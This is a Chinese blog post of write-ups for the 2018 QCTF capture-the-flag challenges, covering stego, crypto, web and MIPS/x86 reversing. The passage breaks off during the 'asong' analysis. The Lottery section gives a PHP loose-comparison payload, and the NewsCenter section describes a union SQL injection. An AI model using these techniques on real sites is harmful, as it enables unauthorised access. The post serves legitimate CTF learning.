<!DOCTYPE html>
<html lang="en">





<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#005f6b">
  <meta name="description" content="Software Security Researcher">
  <meta name="author" content>
  <meta name="keywords" content>
  <title>2018-QCTF - B3ale</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- 自定义样式保持在最底部 -->


<link rel="alternate" href="/atom.xml" title="B3ale" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>B3ale</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">Links</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  Saturday, July 21st 2018, 7:56 pm
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    7.2k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      41 分钟
                  </span>
                

                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <p>其实大部分是看着大佬 wp 的复现。感觉自己实力还是欠缺很多。</p>
<a id="more"></a>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="picture"><a href="#picture" class="headerlink" title="picture"></a>picture</h2><p>通过 stegsolve 判断出存在最低位隐写。使用 lsb 工具解出密文，为一段加密函数：</p>
<pre><code class="python">#_*_ coding:utf-8 _*_
import re
import sys

ip=  (58, 50, 42, 34, 26, 18, 10, 2,
      60, 52, 44, 36, 28, 20, 12, 4,
      62, 54, 46, 38, 30, 22, 14, 6,
      64, 56, 48, 40, 32, 24, 16, 8,
      57, 49, 41, 33, 25, 17, 9 , 1,
      59, 51, 43, 35, 27, 19, 11, 3,
      61, 53, 45, 37, 29, 21, 13, 5,
      63, 55, 47, 39, 31, 23, 15, 7)

ip_1=(40, 8, 48, 16, 56, 24, 64, 32,
      39, 7, 47, 15, 55, 23, 63, 31,
      38, 6, 46, 14, 54, 22, 62, 30,
      37, 5, 45, 13, 53, 21, 61, 29,
      36, 4, 44, 12, 52, 20, 60, 28,
      35, 3, 43, 11, 51, 19, 59, 27,
      34, 2, 42, 10, 50, 18, 58, 26,
      33, 1, 41,  9, 49, 17, 57, 25)

e  =(32, 1,  2,  3,  4,  5,  4,  5,
       6, 7,  8,  9,  8,  9, 10, 11,
      12,13, 12, 13, 14, 15, 16, 17,
      16,17, 18, 19, 20, 21, 20, 21,
      22, 23, 24, 25,24, 25, 26, 27,
      28, 29,28, 29, 30, 31, 32,  1)

p=(16,  7, 20, 21, 29, 12, 28, 17,
     1, 15, 23, 26,  5, 18, 31, 10,
     2,  8, 24, 14, 32, 27,  3,  9,
     19, 13, 30, 6, 22, 11,  4,  25)

s=[ [[14, 4, 13,  1,  2, 15, 11,  8,  3, 10,  6, 12,  5,  9,  0,  7],
     [0, 15,  7,  4, 14,  2, 13,  1, 10,  6, 12, 11,  9,  5,  3,  8],
     [4,  1, 14,  8, 13,  6,  2, 11, 15, 12,  9,  7,  3, 10,  5,  0],
     [15, 12,  8,  2,  4,  9,  1,  7,  5, 11,  3, 14, 10,  0,  6, 13]],

     [[15,  1,  8, 14,  6, 11,  3,  4,  9,  7,  2, 13, 12,  0,  5, 10],
     [3, 13,  4,  7, 15,  2,  8, 14, 12,  0,  1, 10,  6,  9, 11,  5],
     [0, 14,  7, 11, 10,  4, 13,  1,  5,  8, 12,  6,  9,  3,  2, 15],
     [13,  8, 10,  1,  3, 15,  4,  2, 11,  6,  7, 12,  0,  5, 14,  9]],

     [[10,  0,  9, 14,  6,  3, 15,  5,  1, 13, 12,  7, 11,  4,  2,  8],
     [13,  7,  0,  9,  3,  4,  6, 10,  2,  8,  5, 14, 12, 11, 15,  1],
     [13,  6,  4,  9,  8, 15,  3,  0, 11,  1,  2, 12,  5, 10, 14,  7],
     [1, 10, 13,  0,  6,  9,  8,  7,  4, 15, 14,  3, 11,  5,  2, 12]],

    [[7, 13, 14,  3,  0,  6,  9, 10,  1,  2,  8,  5, 11,  12,  4, 15],
     [13,  8, 11,  5,  6, 15,  0,  3,  4,  7,  2, 12,  1, 10, 14,9],
     [10,  6,  9,  0, 12, 11,  7, 13, 15,  1,  3, 14,  5,  2,  8,  4],
     [3, 15,  0,  6, 10,  1, 13,  8,  9,  4,  5, 11, 12,  7,  2, 14]],


    [[2, 12,  4,  1,  7, 10, 11,  6,  8,  5,  3, 15, 13,  0, 14,  9],
     [14, 11,  2, 12,  4,  7, 13,  1,  5,  0, 15, 10,  3,  9,  8,  6],
     [4,  2,  1, 11, 10, 13,  7,  8, 15,  9, 12,  5,  6,  3,  0, 14],
     [11,  8, 12,  7,  1, 14,  2, 13,  6, 15,  0,  9, 10,  4,  5,  3]],

    [[12,  1, 10, 15,  9,  2,  6,  8,  0, 13,  3,  4, 14,  7,  5, 11],
     [10, 15,  4,  2,  7, 12,  9,  5,  6,  1, 13, 14,  0, 11,  3,  8],
     [9, 14, 15,  5,  2,  8, 12,  3,  7,  0,  4, 10,  1, 13, 11,  6],
     [4,  3,  2, 12,  9,  5, 15, 10, 11, 14,  1,  7,  6,  0,  8, 13]],

    [[4, 11,  2, 14, 15,  0,  8, 13,  3, 12,  9,  7,  5, 10,  6,  1],
     [13,  0, 11,  7,  4,  9,  1, 10, 14,  3,  5, 12,  2, 15,  8,  6],
     [1,  4, 11, 13, 12,  3,  7, 14, 10, 15,  6,  8,  0,  5,  9,  2],
     [6, 11, 13,  8,  1,  4, 10,  7,  9,  5,  0, 15, 14,  2,  3, 12]],

   [[13,  2,  8,  4,  6, 15, 11,  1, 10,  9,  3, 14,  5,  0, 12,  7],
     [1, 15, 13,  8, 10,  3,  7,  4, 12,  5,  6, 11,  0, 14,  9,  2],
     [7, 11,  4,  1,  9, 12, 14,  2,  0,  6, 10, 13, 15,  3,  5,  8],
     [2,  1, 14,  7,  4, 10,  8, 13, 15, 12,  9,  0,  3,  5,  6, 11]]]

pc1=(57, 49, 41, 33, 25, 17,  9,
       1, 58, 50, 42, 34, 26, 18,
      10,  2, 59, 51, 43, 35, 27,
      19, 11,  3, 60, 52, 44, 36,
      63, 55, 47, 39, 31, 23, 15,
       7, 62, 54, 46, 38, 30, 22,
      14,  6, 61, 53, 45, 37, 29,
      21, 13,  5, 28, 20, 12, 4);

pc2= (14, 17, 11, 24,  1,  5,  3, 28,
      15,  6, 21, 10, 23, 19, 12,  4,
      26,  8, 16,  7, 27, 20, 13,  2,
      41, 52, 31, 37, 47, 55, 30, 40,
      51, 45, 33, 48, 44, 49, 39, 56,
      34, 53, 46, 42, 50, 36, 29, 32)

d = (  1,  1,  2,  2,  2,  2,  2,  2, 1, 2, 2, 2, 2, 2, 2, 1)

__all__=[&#39;desencode&#39;]
class DES():

  def __init__(self):
    pass

  def code(self,from_code,key,code_len,key_len):
    output=&quot;&quot;
    trun_len=0

    code_string=self._functionCharToA(from_code,code_len)
    code_key=self._functionCharToA(key,key_len)

    if code_len%16!=0:
      real_len=(code_len/16)*16+16
    else:
      real_len=code_len

    if key_len%16!=0:
      key_len=(key_len/16)*16+16
    key_len*=4

    trun_len=4*real_len

    for i in range(0,trun_len,64):
      run_code=code_string[i:i+64]
      l=i%key_len
    run_key=code_key[l:l+64]


            run_code= self._codefirstchange(run_code)
            run_key= self._keyfirstchange(run_key)


            for j in range(16):


                code_r=run_code[32:64]
                code_l=run_code[0:32]


                run_code=code_r


                code_r= self._functionE(code_r)


                key_l=run_key[0:28]
                key_r=run_key[28:56]
                key_l=key_l[d[j]:28]+key_l[0:d[j]]
                key_r=key_r[d[j]:28]+key_r[0:d[j]]
                run_key=key_l+key_r
                key_y= self._functionKeySecondChange(run_key)


                code_r= self._codeyihuo(code_r,key_y)


                code_r= self._functionS(code_r)


                code_r= self._functionP(code_r)


                code_r= self._codeyihuo(code_l,code_r)
                run_code+=code_r

            code_r=run_code[32:64]
            code_l=run_code[0:32]
            run_code=code_r+code_l


            output+=self._functionCodeChange(run_code)
        return output


    def _codeyihuo(self,code,key):
        code_len=len(key)
        return_list=&#39;&#39;
        for i in range(code_len):
            if code[i]==key[i]:
                return_list+=&#39;0&#39;
            else:
                return_list+=&#39;1&#39;
        return return_list


    def _codefirstchange(self,code):
        changed_code=&#39;&#39;
        for i in range(64):
            changed_code+=code[ip[i]-1]
        return changed_code


    def _keyfirstchange (self,key):
        changed_key=&#39;&#39;
        for i in range(56):
            changed_key+=key[pc1[i]-1]
        return changed_key


    def _functionCodeChange(self, code):
        lens=len(code)/4
        return_list=&#39;&#39;
        for i in range(lens):
            list=&#39;&#39;
            for j in range(4):
                list+=code[ip_1[i*4+j]-1]
            return_list+=&quot;%x&quot; %int(list,2)
        return return_list


    def _functionE(self,code):
        return_list=&#39;&#39;
        for i in range(48):
            return_list+=code[e[i]-1]
        return return_list


    def _functionP(self,code):
        return_list=&#39;&#39;
        for i in range(32):
            return_list+=code[p[i]-1]
        return return_list


    def _functionS(self, key):
        return_list=&#39;&#39;
        for i in range(8):
            row=int( str(key[i*6])+str(key[i*6+5]),2)
            raw=int(str( key[i*6+1])+str(key[i*6+2])+str(key[i*6+3])+str(key[i*6+4]),2)
            return_list+=self._functionTos(s[i][row][raw],4)

        return return_list


    def _functionKeySecondChange(self,key):
        return_list=&#39;&#39;
        for i in range(48):
            return_list+=key[pc2[i]-1]
        return return_list


    def _functionCharToA(self,code,lens):
        return_code=&#39;&#39;
        lens=lens%16
        for key in code:
            code_ord=int(key,16)
            return_code+=self._functionTos(code_ord,4)
        if lens!=0:
            return_code+=&#39;0&#39;*(16-lens)*4
        return return_code


    def _functionTos(self,o,lens):
        return_code=&#39;&#39;
        for i in range(lens):
            return_code=str(o&gt;&gt;i &amp;1)+return_code
        return return_code


def tohex(string):
    return_string=&#39;&#39;
    for i in string:
        return_string+=&quot;%02x&quot;%ord(i)
    return return_string

def tounicode(string):
    return_string=&#39;&#39;
    string_len=len(string)
    for i in range(0,string_len,2):
        return_string+=chr(int(string[i:i+2],16))
    return return_string


def desencode(from_code,key):


    from_code=tohex(from_code)
    key=tohex(key)

    des=DES()
    key_len=len(key)
    string_len=len(from_code)

    if string_len&lt;1 or key_len&lt;1:
    print &#39;error input&#39;
        return False
    key_code= des.code(from_code,key,string_len,key_len)
    return key_code


if __name__  == &#39;__main__&#39;:
    if(desencode(sys.argv[1],&#39;mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf&#39;)==&#39;e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72&#39;):
        print &#39;correct.&#39;
    else:
        print &#39;try again.&#39;
</code></pre>
<p>解出来之后发现应该是 DES，但无从下手。后来看了<a href="https://ihomura.cn/2018/07/25/WriteUp-QCTF-keyword-picture/" target="_blank" rel="noopener">孔师傅的 wp</a>，一惊居然还有这种骚操作。</p>
<p>顺便记录一下 <code>__all__</code> 在 python 中：</p>
<pre><code>The only solution is for the package author to provide an explicit index of the package. The import statement uses the following convention: if a package’s init.py code defines a list named all, it is taken to be the list of module names that should be imported when from package import * is encountered. It is up to the package author to keep this list up-to-date when a new version of the package is released. Package authors may also decide not to support it, if they don’t see a use for importing * from their package.
</code></pre><p>最后用<a href="https://github.com/liupengs/DES_Python/blob/master/des.py" target="_blank" rel="noopener">搜到的脚本</a>解密：</p>
<pre><code class="shell">$ python des_1.py
DES 解密

请输入密文（长度不限）:e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72
请输入密钥（长度不限）:mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf
QCTF{eCy0AALMDH9rLoBnWnTigXpYPkgU0sU4}
按确定退出
</code></pre>
<h2 id="Noise"><a href="#Noise" class="headerlink" title="Noise"></a>Noise</h2><p>拿到一个 <code>Noise.wav</code>，发现是 <code>my little pony theme song</code>。尝试用 <code>mp3stego</code> 后无果。再反复听了很多次，发现有一些噪音夹杂在里面。</p>
<p>看一下 hint，个人认为这里最关键的是 hint2，需要了解通过消除伴奏获得人声的原理。</p>
<p><img src="/pics/2018-QCTF/1.png" srcset="/img/loading.gif" alt></p>
<p>关于原理，利用声波叠加干涉消除原声，当声波的相位差达到 180 度的时候，就可以达到消音的效果：</p>
<p><img src="/pics/2018-QCTF/2.png" srcset="/img/loading.gif" alt></p>
<p>跟着<a href="https://www.bilibili.com/video/av560712?spm_id_from=333.338.__bofqi.15" target="_blank" rel="noopener">教程</a>学会怎么使用 <code>Adobe Audition</code>，使声波相位差达到 180 度。</p>
<p>要提取出噪音，我们要做的就是从网上下载原版的 <code>my little pony theme song</code>，然后将 <code>Noise.wav</code> 和它的相位差调整为 180 度，就可以提取出噪音。</p>
<p><img src="/pics/2018-QCTF/3.png" srcset="/img/loading.gif" alt></p>
<p>关于这段噪音的话，和<strong>慢扫描电视</strong>有关。利用软件 <code>MMSSTV</code>，最后得到 flag。</p>
<p><img src="/pics/2018-QCTF/4.png" srcset="/img/loading.gif" alt></p>
<h2 id="X-man-Keyword"><a href="#X-man-Keyword" class="headerlink" title="X-man-Keyword"></a>X-man-Keyword</h2><p>也是 lsb。</p>
<p><img src="/pics/2018-QCTF/5.png" srcset="/img/loading.gif" alt></p>
<p>密码为图片中的 <code>lovekfc</code>。</p>
<p><img src="/pics/2018-QCTF/6.png" srcset="/img/loading.gif" alt></p>
<p>通过提示，将 <code>LOVEKFC</code> 作为关键字提到最前面，和正常顺序的英文字母进行置换。</p>
<pre><code class="plain">PVSF{vVckHejqBOVX9C1c13GFfkHJrjIQeMwf}

LOVEKFCABDGHIJMNPQRSTUWXYZ
ABCDEFGHIJKLMNOPQRSTUVWXYZ

QCTF...
// 容易发现前四位正好是QCTF
</code></pre>
<p>写一下脚本跑出结果：</p>
<pre><code class="cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;ctype.h&gt;

int main() {
    char s1[27] = &quot;lovekfcabdghijmnpqrstuwxyz&quot;;
    char s2[27] = &quot;abcdefghijklmnopqrstuvwxyz&quot;;
    char s3[27] = &quot;LOVEKFCABDGHIJMNPQRSTUWXYZ&quot;;
    char s4[27] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
    char ans[39] = &quot;PVSF{vVckHejqBOVX9C1c13GFfkHJrjIQeMwf}&quot;;
    for(int i = 0; i &lt; strlen(ans); i++) {
        if(islower(ans[i])) {
            for(int j = 0; j &lt; strlen(s1); j++) {
                if(ans[i] == s1[j]) {
                    ans[i] = s2[j];
                    break;
                }
            }
        } else if(isupper(ans[i])) {
            for(int j = 0; j &lt; strlen(s3); j++) {
                if(ans[i] == s3[j]) {
                    ans[i] = s4[j];
                    break;
                }
            }
        } else {
            continue;
        }
    }
    printf(&quot;%s&quot;, ans);
    return 0;
}
</code></pre>
<p><img src="/pics/2018-QCTF/7.png" srcset="/img/loading.gif" alt></p>
<h2 id="X-man-A-face"><a href="#X-man-A-face" class="headerlink" title="X-man-A face"></a>X-man-A face</h2><p>补全二维码定位符，扫出一串类似 base64 的密文。</p>
<p><img src="/pics/2018-QCTF/8.png" srcset="/img/loading.gif" alt></p>
<p>经过尝试，通过 base32 解码得到 flag。</p>
<p><img src="/pics/2018-QCTF/9.png" srcset="/img/loading.gif" alt></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h2><p>通过 GitHack 拿到源码，在 api.php 中：</p>
<pre><code class="php">function buy($req){
    require_registered();
    require_min_money(2);
    $money = $_SESSION[&#39;money&#39;];
    $numbers = $req[&#39;numbers&#39;];
    $win_numbers = random_win_nums();
    $same_count = 0;
    for($i=0; $i&lt;7; $i++){
        if($numbers[$i] == $win_numbers[$i]){
            $same_count++;
        }
    }
</code></pre>
<p><code>$numbers</code> 即用户输入的数字，<code>$win_numbers</code> 即随机生成的数字。根据 PHP 弱类型比较，例如 <code>TRUE</code> 和 <code>1</code> 和 <code>&quot;1&quot;</code> 相等，构造 <code>&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]</code> 即可中最高奖，得到 flag。</p>
<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>直接用联合注入判断出列数为三列后，就开始走流程 emmm。</p>
<p><img src="/pics/2018-QCTF/10.png" srcset="/img/loading.gif" alt></p>
<p><img src="/pics/2018-QCTF/11.png" srcset="/img/loading.gif" alt></p>
<p>显而易见 flag 应该在 <code>secret_table</code> 中。</p>
<p><img src="/pics/2018-QCTF/12.png" srcset="/img/loading.gif" alt></p>
<p>在 <code>fl4g</code> 列中得到 flag：</p>
<p><img src="/pics/2018-QCTF/13.png" srcset="/img/loading.gif" alt></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Xman-babymips"><a href="#Xman-babymips" class="headerlink" title="Xman-babymips"></a>Xman-babymips</h2><p>mips 逆向，看一下 <a href="https://bestwing.me/mips-decompiler-retdec-install-guide.html" target="_blank" rel="noopener">swing 的博客</a>，安装一波 retdec 来反编译。</p>
<p>反编译出几个关键函数：</p>
<ul>
<li>check 函数：</li>
</ul>
<pre><code class="cpp">//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;
//

#include &lt;stdbool.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

// ------------------- Function Prototypes --------------------

int32_t puts(char * a1);
int32_t strlen(char * a1);
int32_t strncmp(char * a1, char * a2, int32_t a3);
int32_t sub_4007F0(char * a1);

// --------------------- Global Variables ---------------------

char * g1 = &quot;\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f&quot;;

// ------------------------ Functions -------------------------

// Address range: 0x4007f0 - 0x4009a8
int32_t sub_4007F0(char * a1) {
    int32_t v1 = (int32_t)a1; // 0x400800
    char * str = (char *)v1; // 0x400800
    int32_t puts_rc;
    if (strlen(str) &lt;= 5) {
        // 0x400934
        if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) {
            // 0x400964
            puts_rc = puts(&quot;Right!&quot;);
            // branch -&gt; 0x40098c
        } else {
            // 0x40097c
            puts_rc = puts(&quot;Wrong!&quot;);
            // branch -&gt; 0x40098c
        }
        // 0x40098c
        return puts_rc;
    }
    int32_t v2 = 5;
    while (true) {
        char * v3 = (char *)(v2 + v1); // 0x4008a8
        int32_t v4 = (int32_t)*v3; // 0x4008a8
        char v5;
        if (v2 % 2 == 0) {
            char v6 = *v3; // 0x4008cc
            v5 = (int32_t)v6 / 64 | 0x4000000 * v4 / 0x1000000;
            // branch -&gt; 0x400900
        } else {
            // 0x400828
            v5 = 64 * (int32_t)*v3 | v4 / 4;
            // branch -&gt; 0x400900
        }
        // 0x400900
        *v3 = v5;
        int32_t v7 = v2 + 1; // 0x400908
        if (v7 &gt;= strlen(str)) {
            // break -&gt; 0x400934
            break;
        }
        v2 = v7;
        // continue -&gt; 0x400814
    }
    // 0x400934
    if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) {
        // 0x400964
        puts_rc = puts(&quot;Right!&quot;);
        // branch -&gt; 0x40098c
    } else {
        // 0x40097c
        puts_rc = puts(&quot;Wrong!&quot;);
        // branch -&gt; 0x40098c
    }
    // 0x40098c
    return puts_rc;
}

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (7.3.0)
// Detected functions: 1
// Decompilation date: 2019-01-23 16:29:29
</code></pre>
<p>逻辑就是先判断奇偶，如果为奇数则将字符的高 6 位作为低 6 位，低 2 位作为高 2 位；反之为偶数，则字符的低 6 位作为高 6 位，高 2 位作为低 2 位。最后和 <code>g1</code> check 一下。</p>
<ul>
<li>main 函数在这里：</li>
</ul>
<pre><code class="cpp">//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;
//

#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

// ------------------- Function Prototypes --------------------

int32_t printf(char * a1);
int32_t puts(char * a1);
int32_t scanf(char * a1);
void setbuf(int32_t a1, char * a2);
int32_t strncmp(char * a1, char * a2, int32_t a3);
int32_t sub_4007F0(int32_t a1);
int32_t sub_4009A8(void);

// --------------------- Global Variables ---------------------

int32_t stdin = 0;
int32_t stdout = 0;

// ------------------------ Functions -------------------------

// Address range: 0x4009a8 - 0x400af8
int32_t sub_4009A8(void) {
    // 0x4009a8
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    printf(&quot;Give me your flag:&quot;);
    scanf(&quot;%32s&quot;);
    int32_t v1 = 0; // bp-48
    int32_t v2 = 0; // 0x400a58
    char * v3 = (char *)((int32_t)&amp;v1 + 4 + v2); // 0x400a28
    *v3 = (char)((int32_t)*v3 ^ 32 - v2);
    int32_t v4 = v1 + 1; // 0x400a70
    v1 = v4;
    // branch -&gt; 0x400a1c
    while (v4 &lt; 32) {
        // 0x400a1c
        v2 = v4;
        v3 = (char *)((int32_t)&amp;v1 + 4 + v2);
        *v3 = (char)((int32_t)*v3 ^ 32 - v2);
        v4 = v1 + 1;
        v1 = v4;
        // continue -&gt; 0x400a1c
    }
    int32_t str = 0; // bp-44
    int32_t puts_rc;
    if (strncmp((char *)&amp;str, &quot;Q|j{g&quot;, 5) == 0) {
        // 0x400ab4
        puts_rc = sub_4007F0((int32_t)&amp;str);
        // branch -&gt; 0x400adc
    } else {
        // 0x400acc
        puts_rc = puts(&quot;Wrong&quot;);
        // branch -&gt; 0x400adc
    }
    // 0x400adc
    return puts_rc;
}

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (7.3.0)
// Detected functions: 1
// Decompilation date: 2019-01-23 16:29:58
</code></pre>
<p>main 中先输入字符串，然后将字符串中的每个字符依次与 <code>32-i</code> 异或，前五位与 <code>Q|j{g</code> 比较，之后将字符串作为参数调用上一个 check 函数。</p>
<p>由于之前的奇偶难以判断，所以采用爆破的方式。用 python 写出爆破脚本：</p>
<pre><code class="python">#!/usr/bin/env python
enc1 = &#39;Q|j{g&#39;
enc2 = &#39;\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f&#39;
flag = &#39;&#39;
for i in range(5):
    ch = ord(enc1[i]) ^ (32 - i)
    print &#39;index&#39;, i, &#39;==&gt;&#39;, chr(ch)
    flag += chr(ch)
for i in range(5, 32):
    for ch in range(256):
        t = ch ^ (32 - i)
        if i % 2 == 0:
            res = ((t &lt;&lt; 2) &amp; 0xff) | (t &gt;&gt; 6)
        else:
            res = (t &gt;&gt; 2) | ((t &lt;&lt; 6) &amp; 0xff)
        if res == ord(enc2[i - 5]):
            print &#39;index&#39;, i, &#39;==&gt;&#39;, chr(ch)
            flag += chr(ch)
            break
print len(flag)
print &#39;flag:&#39;, flag
</code></pre>
<p>最后放上官方给出的源码：</p>
<pre><code class="cpp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
char *check1=&quot;Q|j{g&quot;;
char *check2= &quot;\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f&quot;;
void check(char *s){
    int i;
    for(i=5;i&lt;strlen(s);i++){
        if(i%2)
            s[i]=(s[i]&gt;&gt;2)|((s[i]&lt;&lt;6)&amp;0xff);
        else
            s[i]=((s[i]&lt;&lt;2)&amp;0xff)|(s[i]&gt;&gt;6);
    }
    if(!strncmp(&amp;s[5],check2,27))
        printf(&quot;Right!\n&quot;);
    else
        printf(&quot;Wrong!\n&quot;);
}
void main(){
    char s[33];
    int i;
    printf(&quot;Give me your flag:&quot;);
    scanf(&quot;%32s&quot;,s);

    for(i=0;i&lt;32;i++)
        s[i]^=(32-i);
    if(!strncmp(s,check1,5))
        check(s);
    else
        printf(&quot;Wrong\n&quot;);
}
</code></pre>
<h2 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h2><p>总共给了三个文件，<code>asong</code> 为可执行文件，<code>that_girl</code> 以及 <code>out</code> 都是 ascii 文本。将 <code>asong</code> 拖进 ida 后，看到 main 函数的样子：</p>
<pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  void *girl; // ST00_8
  char *input; // ST08_8

  girl = malloc(0xBCuLL);
  input = (char *)malloc(0x50uLL);
  init_func();
  getline(input);
  simple_check(input);
  cal(&quot;that_girl&quot;, (__int64)girl);
  encrypt(input, (__int64)girl);
  return 0LL;
}
</code></pre>
<p>第一个 <code>init_func()</code>，设置一下缓冲区：</p>
<pre><code class="cpp">void init_func()
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
}
</code></pre>
<p><code>getline()</code> 函数实现了一个简单的读取一行的功能：</p>
<pre><code class="cpp">char __fastcall getline(char *a1)
{
  char *v1; // rax
  signed int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    LOBYTE(v1) = read(0, &amp;a1[i], 1uLL) == 1;
    if ( !(_BYTE)v1 )
      break;
    if ( a1[i] == 10 || i &gt; 100 )
    {
      v1 = &amp;a1[i];
      *v1 = 0;
      return (char)v1;
    }
  }
  return (char)v1;
}
</code></pre>
<p><code>simple_check()</code> 函数检查读入字符串中是否以 <code>&#39;QCTF{&#39;</code> 开头，以及是否以 <code>&#39;}&#39;</code> 结尾：</p>
<pre><code class="cpp">void __fastcall simple_check(char *a1)
{
  int v1; // [rsp+14h] [rbp-Ch]
  void *dest; // [rsp+18h] [rbp-8h]

  dest = malloc(0x50uLL);
  if ( memcmp(a1, &quot;QCTF{&quot;, 5uLL) )
    exit(-1);
  memcpy(dest, a1 + 5, 0x4BuLL);
  v1 = strlen((const char *)dest);
  if ( *((_BYTE *)dest + v1 - 1) == &#39;}&#39; )
    *((_BYTE *)dest + v1 - 1) = 0;
  memcpy(a1, dest, 0x50uLL);
  free(dest);
}
</code></pre>
<p><code>cal()</code> 函数读取了文件 <code>that_girl</code> 的内容，应该是通过 <code>convert()</code> 函数对其中的每个字符做了一个词频的统计：</p>
<pre><code class="cpp">int __fastcall cal(const char *that_girl, __int64 girl)
{
  int v2; // eax
  char *v4; // [rsp+0h] [rbp-20h]
  char buf; // [rsp+13h] [rbp-Dh]
  int fd; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

